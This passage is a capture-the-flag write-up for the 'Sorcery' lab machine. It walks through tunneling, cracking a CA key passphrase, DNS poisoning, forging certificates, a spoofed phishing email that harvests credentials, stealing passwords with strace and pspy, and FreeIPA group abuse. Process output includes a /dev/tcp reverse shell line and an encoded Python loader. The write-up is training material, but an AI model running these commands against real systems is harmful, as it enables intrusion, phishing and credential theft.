Found out that the ftp service is running on `172.19.0.3` and the mail service is running on `172.19.0.7`. <br>

### FTP
Let's tunnel this shell back to our kali to discover more about these services. <br>
&rarr; I will use [chisel](https://github.com/jpillora/chisel) to do this. Can grab the binary from [here](https://github.com/jpillora/chisel/releases/tag/v1.10.1).

```bash
└─$ wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz

└─$ gunzip chisel_1.10.1_linux_amd64.gz

└─$ mv chisel_1.10.1_linux_amd64 chisel

└─$ chmod +x chisel
```

```bash
(Penelope)─(Session [1])> interact
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/7bfb70ee5b9c~10.129.xx.xx-Linux-x86_64/2025_06_16-10_55_20-631.log 📜
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
bash: /root/.bashrc: Permission denied
user@7bfb70ee5b9c:/app$ cd /tmp
[!] Session detached ⇲

(Penelope)─(Session [1])> upload chisel
[+] Upload OK /tmp/chisel-QsYxirww
```

Remember to add `socks5 127.0.0.1 1080` to `/etc/proxychains.conf` or `/etc/proxychains4.conf`.

On our kali machine:
```bash
└─$ ./chisel server --reverse --port 9000
2025/06/16 11:01:31 server: Reverse tunnelling enabled
2025/06/16 11:01:31 server: Fingerprint QNqEO+PxnLm10L77HmbaNmC5Qo0mx9RlOE1nscRDjts=
2025/06/16 11:01:31 server: Listening on http://0.0.0.0:9000
```

Victim machine:
```bash
user@7bfb70ee5b9c:/tmp$ ./chisel-QsYxirww client 10.xx.xx.xx:9000 R:1080:socks
2025/06/16 15:06:02 client: Connecting to ws://10.xx.xx.xx:9000
2025/06/16 15:06:03 client: Connected (Latency 35.959347ms)
```

```bash
└─$ ./chisel server --reverse --port 9000
2025/06/16 11:01:31 server: Reverse tunnelling enabled
2025/06/16 11:01:31 server: Fingerprint QNqEO+PxnLm10L77HmbaNmC5Qo0mx9RlOE1nscRDjts=
2025/06/16 11:01:31 server: Listening on http://0.0.0.0:9000
2025/06/16 11:06:02 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Finish setting up tunnel. Now use `proxychains` to enumerate the ftp service.

```bash
└─$ proxychains ftp 172.19.0.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21  ...  OK
Connected to 172.19.0.3.
220 (vsFTPd 3.0.3)
Name (172.19.0.3:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||21110|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21110  ...  OK
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Oct 31  2024 pub
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||21103|)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21103  ...  OK
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          1826 Oct 31  2024 RootCA.crt
-rw-r--r--    1 ftp      ftp          3434 Oct 31  2024 RootCA.key
ftp> mget RootCA.*
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.19.0.3:21101  ...  OK
```

Got these files and get them back to our machine.

## Phising Credentials
### DNS Service
Also found something interesting `/dns` folder.
```bash
user@7bfb70ee5b9c:/dns$ ls -la
total 24
drwxr-xr-x 1 user user 4096 Apr 28 12:07 .
drwxr-xr-x 1 root root 4096 Apr 28 12:07 ..
-rwxr-xr-x 1 root root  364 Aug 31  2024 convert.sh
-rwxr--r-- 1 user user  598 Jun 16 03:42 entries
-rw-r--r-- 1 root root  598 Jun 15 03:16 hosts
```

Checking out the `convert.sh` file.

```bash
user@7bfb70ee5b9c:/dns$ cat convert.sh
#!/bin/bash

entries_file=/dns/entries
hosts_files=("/dns/hosts" "/dns/hosts-user")

> $entries_file

for hosts_file in ${hosts_files[@]}; do
  while IFS= read -r line; do
    key=$(echo $line | awk '{ print $1 }')
    values=$(echo $line | cut -d ' ' -f2-)

    for value in $values; do
      echo "$key $value" >> $entries_file
    done
  done < $hosts_file
```

This file just simply read out the `hosts` and `hosts-user` files and write to the `entries` file. <br>

If we checking the process running on the machine, we can see that there is a `dnsmasq` process running.

```bash
user@7bfb70ee5b9c:/app$ ps -aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   3924  2944 ?        Ss   10:08   0:00 /bin/bash /docker-entrypoint.sh
root           9  0.0  0.3  36976 29968 ?        S    10:08   0:03 /usr/bin/python3 /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
root          10  0.0  0.0   2576  1408 ?        S    10:08   0:00 sh -c while true; do printf "READY\n"; read line; kill -9 $PPID; printf "RESULT 2\n"; printf "OK"; done
user          11  0.1  0.0   8812  4352 ?        S    10:08   0:13 /app/dns
user          12  0.0  0.0  11572  4608 ?        S    10:08   0:00 /usr/sbin/dnsmasq --no-daemon --addn-hosts /dns/hosts-user --addn-hosts /dns/hosts
user          23  0.0  0.0   4300  2944 ?        S    12:36   0:00 bash -c /bin/bash -i >& /dev/tcp/10.xx.xx.xx/1337 0>&1
user          24  0.3  0.0   4300  3072 ?        S    12:36   0:00 /usr/bin/bash
user          52  0.3  0.1  16080 11136 ?        S    12:36   0:00 /usr/bin/python3 -Wignore -c import base64,zlib;exec(zlib.decompress(base64.b64decode("eNqVWV9v40YOf5Y+xaz7YK
user          53  0.0  0.0   4564  3584 pts/0    Ss   12:36   0:00 /usr/bin/bash -i
user          57  0.0  0.0   8436  4224 pts/0    R+   12:36   0:00 ps -aux
```

Combine these with information we get from the `Blog` section. <br>
- `<subdomain>.sorcery.htb` which we can create a file `/dns/hosts-user` and write a rule that points a subdomain to our machine.
- Need to setup an HTTPS server with a certificate signed by the root CA, which is "securely" stored on the FTP server.
- Also need to restart the process `dnsmasq` to apply our new DNS rules.

Let's get to in.

```bash
user@7bfb70ee5b9c:/dns$ echo "10.xx.xx.xx gg.sorcery.htb" >> /dns/hosts-user
user@7bfb70ee5b9c:/dns$ bash convert.sh
user@7bfb70ee5b9c:/dns$ pkill -9 dnsmasq
```

### Forge Certificate
First let's generate a certificate for `match.sorcery.htb`.

```bash
└─$ openssl genrsa -out match.sorcery.htb.key 2048
```

And then generate a certificate signing request.

```bash
└─$ openssl req -new -key match.sorcery.htb.key -out match.sorcery.htb.csr -subj "/CN=match.sorcery.htb"
```

Then we will sign the certificate with the root CA. <br>
> We need to remove the passphrase from the root CA key.

When running, does not know the passphrase so I enter random and it got this problem.

```bash
└─$ openssl rsa -in RootCA.key -out RootCA-unenc.key
Enter pass phrase for RootCA.key:
Could not find private key from RootCA.key
40F733F8057F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:107:
40F733F8057F0000:error:11800074:PKCS12 routines:PKCS12_pbe_crypt_ex:pkcs12 cipherfinal error:../crypto/pkcs12/p12_decr.c:92:maybe wrong password
```

```bash
└─$ file RootCA.key 
RootCA.key: OpenSSH private key (with password)
```

So we gonna create a bash script to bruteforce the passphrase.

```bash
└─$ cat crack.sh                   
#!/bin/bash
while IFS= read -r pass; do
    openssl rsa -in RootCA.key -out /dev/null -passin pass:"$pass" 2>/dev/null && { echo "Password found: $pass"; exit 0; }
done < /usr/share/wordlists/rockyou.txt
```

```bash
└─$ ./crack.sh                                               
Password found: password
```

Got the passphrase. Now we can previous command again.

```bash
└─$ openssl rsa -in RootCA.key -out RootCA-unenc.key
Enter pass phrase for RootCA.key: #input password
writing RSA key
```

After that we can use the root CA key to sign the certificate.

```bash
└─$ openssl x509 -req -in match.sorcery.htb.csr -CA RootCA.crt -CAkey RootCA-unenc.key -CAcreateserial -out match.sorcery.htb.crt -days 365
Certificate request self-signature ok
subject=CN=match.sorcery.htb
```

Now combine these two files into a single `.pem` file.

```bash
└─$ cat match.sorcery.htb.key match.sorcery.htb.crt > match.sorcery.htb.pem
```

Next, we will setup intercepting proxy to intercept the traffic to `match.sorcery.htb`. <br>
&rarr; We gonna use [mitmproxy](https://github.com/mitmproxy/mitmproxy) to do this.

### Intercepting Proxy
```bash
└─$ mitmproxy --mode reverse:https://git.sorcery.htb --certs match.sorcery.htb.pem --save-stream-file traffic.raw -k -p 443
```

How it works: <br>
- Start mitmproxy in reverse proxy mode.
- Intercept HTTPS traffic to `git.sorcery.htb`.
- `--save-stream-file traffic.raw`: Save all HTTP/HTTPS traffic to file (raw binary format).
- `-k`: Use fake certificate to avoid SSL warnings.
- Listen on port 443 (HTTPS).

It will pop up a terminal waiting for the traffic. <br>

![Mitmproxy](/assets/img/sorcery-htb-season8/sorcery-htb-season8_mitmproxy.png)

### Send Phishing Email
Now we need to send a phishing email to the victim. Our target will be `tom_summers@sorcery.htb`. <br>
> You can look back at the `Blog` section and see that in `Phising awareness` section.

```bash
└─$ proxychains -q swaks --to tom_summers@sorcery.htb --from nicole_sullivan@sorcery.htb --server 172.19.0.7 --port 1025 --data "Subject: Hello Tom\nHi Tom,\nPlease check this link: https://match.sorcery.htb/user/login\n"
=== Trying 172.19.0.7:1025...
=== Connected to 172.19.0.7.
<-  220 mailhog.example ESMTP MailHog
 -> EHLO kali
<-  250-Hello kali
<-  250-PIPELINING
<-  250 AUTH PLAIN
 -> MAIL FROM:<nicole_sullivan@sorcery.htb>
<-  250 Sender nicole_sullivan@sorcery.htb ok
 -> RCPT TO:<tom_summers@sorcery.htb>
<-  250 Recipient tom_summers@sorcery.htb ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Subject: Hello Tom
 -> Hi Tom,
 -> Please check this link: https://match.sorcery.htb/user/login
 -> 
 -> 
 -> .
<-  250 Ok: queued as kkJ_gqtjfr1i1sKVlOqnhHj4afaJIvbIHF_c6X1ZUvk=@mailhog.example
 -> QUIT
<-  221 Bye
=== Connection closed with remote host.
```

Here is the explanation: <br>
- `proxychains -q`: Route via SOCKS tunnel (quiet mode).
- `swaks`: Send fake email tool.
- `--to/--from`: Spoof sender and recipient.
- `--server MAILDOCKERIP --port 1025`: Target internal mail server.
- `--data`: Email content with malicious link pointing to intercepting proxy.

Checking back and here is what we got.

![mitmproxy](/assets/img/sorcery-htb-season8/sorcery-htb-season8_mitmproxy_2.png)

When enter to the `HTTPS Post` tab.

![mitmproxy](/assets/img/sorcery-htb-season8/sorcery-htb-season8_mitmproxy_3.png)

Got `tom_summers` credentials. <br>
&rarr; `tom_summers:jNsMKQ6k2.XDMPu.`

Wow, what a amazing attack flow: <br>
`Tunnel → Download CA → Forge Certificate → Intercept HTTPS → Phish Credentials` <br>

Summary: <br>
- DNS Poisoning: Map domain to attacker IP.
- Kill dnsmasq: Clear DNS cache for poisoning to take effect.
- Network Tunneling: Access internal Docker network.
- Certificate Forgery: Create fake SSL cert for domain.
- Proxy Intercept: Setup HTTPS intercepting proxy.
- Phishing Email: Send email with malicious link.
- Credential Harvest: When victim clicks link → credentials captured.

```bash
└─$ ssh tom_summers@10.129.xx.xx   
tom_summers@main:~$ ls
user.txt
tom_summers@main:~$ cat user.txt
51ad77xxxxxxxxxxxxxxxxxxxxxxxxxx
```

Grab the `user.txt` flag. Really tough!

## Initial Access
Now we have `tom_summers`, let's enumerate more to escalate to `root`.

### Enumerate
```bash
tom_summers@main:/home$ ls -la
total 28
drwxr-xr-x  7 root              root              4096 Oct 31  2024 .
drwxr-xr-x 25 root              root              4096 Apr 28 12:11 ..
drwxr-x---  4 rebecca_smith     rebecca_smith     4096 Oct 30  2024 rebecca_smith
drwxr-x---  3 tom_summers       tom_summers       4096 Jun 15 00:30 tom_summers
drwxr-x---  5 tom_summers_admin tom_summers_admin 4096 Oct 30  2024 tom_summers_admin
drwxr-x---  4 user              user              4096 Apr 28 11:37 user
drwxr-x---  5 vagrant           vagrant           4096 Oct 30  2024 vagrant
```

Found our more users: `rebecca_smith`, `tom_summers_admin`.

```bash
tom_summers@main:/$ ifconfig
br-24ea6f65bc59: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.21.0.1  netmask 255.255.0.0  broadcast 172.21.255.255
        inet6 fe80::c43d:b3ff:fef2:50d7  prefixlen 64  scopeid 0x20<link>
        ether c6:3d:b3:f2:50:d7  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
br-3ff4274bb73e: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.23.0.1  netmask 255.255.0.0  broadcast 172.23.255.255
        inet6 fe80::a0c3:e0ff:fea9:c082  prefixlen 64  scopeid 0x20<link>
        ether a2:c3:e0:a9:c0:82  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
br-9ea714ea7b8c: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
        inet6 fe80::3053:adff:fec8:bc5a  prefixlen 64  scopeid 0x20<link>
        ether 32:53:ad:c8:bc:5a  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 5e:e0:08:01:e1:b9  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Got ip of `docker0` interface. Interesting!

After a while, got this weird folder `/xorg` and when checking it.
```bash
tom_summers@main:/xorg/xvfb$ ls -la
total 524
drwxr-xr-x 2 tom_summers_admin tom_summers_admin   4096 Jun 15 03:13 .
drwxr-xr-x 3 root              root                4096 Apr 28 12:07 ..
-rwxr--r-- 1 tom_summers_admin tom_summers_admin 527520 Jun 15 03:13 Xvfb_screen0
```

Found out there is a file `Xvfb_screen0`. <br>
&rarr; Pull it back to our machine.

```bash
└─$ scp tom_summers@10.129.xx.xx:/xorg/xvfb/Xvfb_screen0 .     
(tom_summers@10.129.xx.xx) Password: 
Xvfb_screen0
```

### Xvfb
```bash
└─$ file Xvfb_screen0
Xvfb_screen0: X-Window screen dump image data, version X11, "Xvfb main.sorcery.htb:1.0", 512x256x24, 256 colors 256 entries
```

So this is a X11 screen dump image which has a screenshot of `tom_summers_admin` screen. <br>
&rarr; Maybe this one has captured the password of `tom_summers_admin`.

Found out this [xwud](https://docs.oracle.com/cd/E36784_01/html/E36870/xwud-1.html) to display the image.

```bash
└─$ xwud -in Xvfb_screen0
```

![xwud](/assets/img/sorcery-htb-season8/sorcery-htb-season8_xwud.png)

We can see there is password for `tom_summers_admin` in the image. <br>
There is a problem, we can not copy that to save it. <br>
> In case if we lazy, we can type them out to the notepad.

Gonna use some tools from [netpbm](https://www.commandlinux.com/man-page/man1/netpbm.1.html) to convert the image to a text file.

```bash
└─$ xwdtopnm Xvfb_screen0 > screen.pnm

└─$ pnmtopng screen.pnm > screen.png

└─$ tesseract screen.png credentials.txt

└─$ cat credentials.txt
File Edit Search View Document Help

lusername: tom_summers_admin
password: dWpuk7xxxxxxx
```

Got the password for `tom_summers_admin`. <br>
&rarr; `dWpuk7xxxxxxx`

```bash
└─$ ssh tom_summers_admin@10.129.xx.xx
(tom_summers_admin@10.129.xx.xx) Password: 
tom_summers_admin@main:~$ ls -la
total 20
drwxr-x--- 5 tom_summers_admin tom_summers_admin 4096 Oct 30  2024 .
drwxr-xr-x 7 root              root              4096 Oct 31  2024 ..
lrwxrwxrwx 1 root              root                 9 Oct 30  2024 .bash_history -> /dev/null
drwx------ 4 tom_summers_admin tom_summers_admin 4096 Apr  6 13:36 .cache
drwxr-xr-x 2               700 tom_summers_admin 4096 Oct 30  2024 .docker
drwx------ 3 tom_summers_admin tom_summers_admin 4096 Oct 30  2024 .local
tom_summers_admin@main:~$
```

### Docker Process Injection
```bash
tom_summers_admin@main:/$ sudo -l
Matching Defaults entries for tom_summers_admin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tom_summers_admin may run the following commands on localhost:
    (rebecca_smith) NOPASSWD: /usr/bin/docker login
    (rebecca_smith) NOPASSWD: /usr/bin/strace -s 128 -p [0-9]*
```

This one will checking the sudo permission of current user which is allowed to execute. <br>
We can see that `tom_summers_admin` can execute `docker login` and `strace -s 128 -p [0-9]*` under `rebecca_smith` user.

I found this article [Escaping Docker Container: An Attacker's Perspective](https://wizardcyber.com/escaping-docker-container-an-attackers-perspective/) and it's really helpful.

```bash
tom_summers@main:~$ capsh --print
Current: =
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
Ambient set =
Current IAB: 
Securebits: 00/0x0/1'b0 (no-new-privs=0)
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=2001(tom_summers) euid=2001(tom_summers)
gid=2001(tom_summers)
groups=2001(tom_summers)
Guessed mode: HYBRID (4)
```

From this output, we can see that `tom_summers_admin` has `cap_sys_ptrace` capability. <br>

Now we gonna craft a bash script to inject into the docker process to grab `rebecca_smith` password.

```bash
#!/bin/bash
sleep 2

# 1. Launch docker login as rebecca_smith
sudo -u rebecca_smith /usr/bin/docker login &

# 2. Find the PID immediately
TARGET_PID=""
while [ -z "$TARGET_PID" ]; do
    TARGET_PID=$(pgrep -u rebecca_smith -f "/usr/bin/docker login")
done

echo "[*] Target process found! PID: $TARGET_PID"
echo "[*] Attaching strace NOW..."

# 3. Attach strace as rebecca_smith
sudo -u rebecca_smith /usr/bin/strace -s 128 -p $TARGET_PID -f -e trace=openat,read
```

```bash
tom_summers_admin@main:/tmp$ ./docker_process_injection.sh 
[*] Target process found! PID: 78330
[*] Attaching strace NOW...
/usr/bin/strace: Process 78330 attached with 8 threads
This account might be protected by two-factor authentication
In case login fails, try logging in with <password><otp>
[pid 78333] read(7, "{\"Username\":\"rebecca_smith\",\"Secret\":\"-7eAZDp9xxxxxx\"}\n", 512) = 54
[pid 78333] read(7, 0xc000140836, 970)  = -1 EAGAIN (Resource temporarily unavailable)
[pid 78333] read(7, "", 970)            = 0
[pid 78337] --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=78339, si_uid=2003, si_status=0, si_utime=22 /* 0.22 s */, si_stime=8 /* 0.08 s */} ---
Authenticating with existing credentials... [Username: rebecca_smith]
```

Got the password for `rebecca_smith`. <br>
&rarr; `-7eAZDp9xxxxxx`

Also there is another approach to get password of `rebecca_smith` that I used [pspy](https://github.com/DominicBreuker/pspy) to do this.

```bash
2025/06/17 09:41:01 CMD: UID=0     PID=1198212 | htpasswd -Bbc /home/vagrant/source/registry/auth/registry.password rebecca_smith -7eAZDp9xxxxxx740280
```

```bash
└─$ ssh rebecca_smith@10.129.xx.xx
(rebecca_smith@10.129.xx.xx) Password: 
rebecca_smith@main:~$
```

After a while of recon, just found these stuffs but not much to do.

```bash
rebecca_smith@main:~/.docker$ ls -al
total 16
drwx------ 2 rebecca_smith rebecca_smith 4096 Jun 17 12:54 .
drwxr-x--- 5 rebecca_smith rebecca_smith 4096 Jun 17 13:28 ..
-rwx------ 1 rebecca_smith rebecca_smith   84 Jun 17 12:54 config.json
-rwx------ 1 rebecca_smith rebecca_smith   88 Jun 17 13:19 creds
rebecca_smith@main:~/.docker$ cat creds
ls/Lbtzq4b4D/ItZy5SchUvKEzgO7+XHLaVbze4KOKzZxqhsTRWdBmAw1Fcs/nWhIvQVLcoa5NF39WM3tv6jVA==
rebecca_smith@main:~/.docker$ cat config.json 
{
        "auths": {
                "https://index.docker.io/v1/": {}
        },
        "credsStore": "docker-auth"
}
rebecca_smith@main:~/.docker$
```

```bash
rebecca_smith@main:~$ netstat -tunlp
(No info could be read for "-p": geteuid()=2003 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:464           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:389           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:88            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:636           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::443                  :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.54:53           0.0.0.0:*                           -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:88            0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:323           0.0.0.0:*                           -                   
udp        0      0 127.0.0.1:464           0.0.0.0:*                           -                   
udp6       0      0 ::1:323                 :::*                                -
```

Try ldap enumeration. <br>
> Remmeber to upload `chisel` so you can enumerate the internal network.

```bash
└─$ proxychains ldapsearch -x -H ldap://127.0.0.1 -b "dc=sorcery,dc=htb" "(objectClass=person)" cn
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:389  ...  OK
# extended LDIF
#
# LDAPv3
# base <dc=sorcery,dc=htb> with scope subtree
# filter: (objectClass=person)
# requesting: cn 
#

# admin, users, accounts, sorcery.htb
dn: uid=admin,cn=users,cn=accounts,dc=sorcery,dc=htb
cn: Administrator

# donna_adams, users, accounts, sorcery.htb
dn: uid=donna_adams,cn=users,cn=accounts,dc=sorcery,dc=htb
cn: donna adams

# ash_winter, users, accounts, sorcery.htb
dn: uid=ash_winter,cn=users,cn=accounts,dc=sorcery,dc=htb
cn: ash winter

# search result
search: 2
result: 0 Success

# numResponses: 4
# numEntries: 3
```

Found out for users: `admin`, `donna_adams`, `ash_winter`.

I try some risky tools which is [PEASS](https://github.com/peass-ng/PEASS-ng). After running this against `rebecca_smith` user. <br>
&rarr; Transfer result back to our machine.

```bash
└─$ scp rebecca_smith@10.129.xx.xx:/tmp/linpeas_results.txt .
```

Lots of information but here is what would be necessary enough.

![linpeas](/assets/img/sorcery-htb-season8/sorcery-htb-season8_linpeas.png)

```bash
/etc/hosts:
  127.0.0.1 localhost main.sorcery.htb sorcery sorcery.htb
  127.0.1.1 ubuntu-2404
  ::1     ip6-localhost ip6-loopback
  fe00::0 ip6-localnet
  ff00::0 ip6-mcastprefix
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters
  172.23.0.2 dc01.sorcery.htb
```

Got another subdomain: `dc01.sorcery.htb`. <br>
&rarr; Add it to `/etc/hosts`.

![linpeas](/assets/img/sorcery-htb-season8/sorcery-htb-season8_linpeas_2.png)

```bash
rebecca_smith@main:/etc/ipa/nssdb$ cat /etc/ipa/default.conf
#File modified by ipa-client-install
[global]
basedn = dc=sorcery,dc=htb
realm = SORCERY.HTB
domain = sorcery.htb
server = dc01.sorcery.htb
host = main.sorcery.htb
xmlrpc_uri = https://dc01.sorcery.htb/ipa/xml
enable_ra = True
```

This one is new, FreeIPA. Brief about it on [FreeIPA](https://www.freeipa.org/) page.

So I continue using [pspy](https://github.com/DominicBreuker/pspy) to see what happens in `rebecca_smith` user.

### Pspy
```bash
rebecca_smith@main:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done

...

2025/06/17 14:49:11 CMD: UID=2003  PID=278063 | grep ipa 
2025/06/17 14:49:11 CMD: UID=1638400000 PID=277271 | /usr/bin/python3 -I /usr/bin/ipa user-mod ash_winter --setattr userPassword=w@LoiU8xxxxxx 
2025/06/17 14:49:11 CMD: UID=165536 PID=8967   | /usr/bin/python3 -I /usr/libexec/ipa/ipa-custodia /etc/ipa/custodia/custodia.conf 
2025/06/17 14:49:11 CMD: UID=165825 PID=8923   | (wsgi:ipa)      -DFOREGROUND 
2025/06/17 14:49:11 CMD: UID=165825 PID=8915   | (wsgi:ipa)      -DFOREGROUND 
2025/06/17 14:49:11 CMD: UID=165825 PID=8910   | (wsgi:ipa)      -DFOREGROUND 
2025/06/17 14:49:11 CMD: UID=165825 PID=8903   | (wsgi:ipa)      -DFOREGROUND 
2025/06/17 14:49:11 CMD: UID=165536 PID=3419   | tail --silent -n 0 -f --retry /var/log/ipa-server-configure-first.log /var/log/ipa-server-run.log
```

Hurray! Got the password for `ash_winter`. <br>
&rarr; `w@LoiU8xxxxxx`

## Privilege Escalation
### FreeIPA (abuse ipa privilege)
When we ssh to `ash_winter` user, we got this.
```bash
└─$ ssh ash_winter@10.129.xx.xx     
(ash_winter@10.129.xx.xx) Password: 
Password expired. Change your password now.
(ash_winter@10.129.xx.xx) Current Password: 
(ash_winter@10.129.xx.xx) New password: 
(ash_winter@10.129.xx.xx) Retype new password: 
$ /bin/bash
ash_winter@main:~$
```

We got prompt to change the password due to password expired. <br>
&rarr; So I change it to `password@123`.

Check for the privileges.
```bash
ash_winter@main:/$ sudo -l
Matching Defaults entries for ash_winter on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User ash_winter may run the following commands on localhost:
    (root) NOPASSWD: /usr/bin/systemctl restart sssd
```

Okay, we got `NOPASSWD` privilege to restart `sssd` service. <br>
&rarr; Found out this [Sudo Rule](https://freeipa.readthedocs.io/en/latest/workshop/8-sudorule.html) page which is useful for enumeration.

```bash
ash_winter@main:/$ ipa group-find
----------------
5 groups matched
----------------
  Group name: admins
  Description: Account administrators group
  GID: 1638400000

  Group name: editors
  Description: Limited admins who can edit other users
  GID: 1638400002

  Group name: ipausers
  Description: Default group for all users

  Group name: sysadmins
  GID: 1638400005

  Group name: trust admins
  Description: Trusts administrators group
----------------------------
Number of entries returned 5
----------------------------
```

So here is the group membership of `ash_winter`.

```bash
ash_winter@main:/$ ipa user-show ash_winter --all | grep 'Member of groups'
  Member of groups: ipausers
```

And `ash_winter` is in `ipausers` group. <br>
&rarr; Let's check for the `sudorule`

```bash
ash_winter@main:~$ ipa sudorule-find
-------------------
1 Sudo Rule matched
-------------------
  Rule name: allow_sudo
  Enabled: True
  Host category: all
  Command category: all
  RunAs User category: all
  RunAs Group category: all
----------------------------
Number of entries returned 1
----------------------------
```

Checking for the `sudorule` of `ash_winter`.

```bash
ash_winter@main:~$ ipa sudorule-find --user=ash_winter
--------------------
0 Sudo Rules matched
--------------------
----------------------------
Number of entries returned 0
----------------------------
```

So we need to add `ash_winter` to `sysadmins` group and also add `allow_sudo` to `sudorule`. <br>
&rarr; So that `ash_winter` can escalate to `root`.

First, let's add `ash_winter` to `sysadmins` group.

```bash
ash_winter@main:/$ ipa group-add-member sysadmins --users=ash_winter
  Group name: sysadmins
  GID: 1638400005
  Member users: ash_winter
  Indirect Member of role: manage_sudorules_ldap
-------------------------
